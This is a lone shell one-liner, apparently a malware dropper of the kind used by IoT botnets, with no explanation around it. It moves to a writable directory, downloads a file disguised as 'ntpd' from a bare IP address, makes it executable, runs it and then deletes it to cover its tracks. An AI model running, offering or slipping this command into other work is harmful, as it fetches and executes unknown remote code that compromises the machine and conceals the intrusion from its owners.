cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.242/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
